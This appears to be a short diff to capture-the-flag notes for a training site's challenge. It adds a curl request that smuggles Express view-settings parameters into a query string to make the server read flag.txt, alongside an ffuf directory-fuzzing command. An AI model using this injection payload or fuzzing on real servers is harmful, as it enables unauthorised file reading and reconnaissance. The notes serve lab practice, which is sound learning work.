@@ -15,5 +15,8 @@ for finding vulnerable endpoints
 
     ffuf -u https://challenges.hackdemy.com/handle/FUZZ -w /usr/share/wordlists/dirb/common.txt 
 
+     curl "http://challenges.hackdemy.com/handle?settings%5Bviews%5D=.&settings%5Bview%20options%5D%5Blayout%5D)=flag.txt" 
+
+    ffuf -u https://challenges.hackdemy.com/handle/FUZZ -w /usr/share/wordlists/dirb/common.txt
 
 
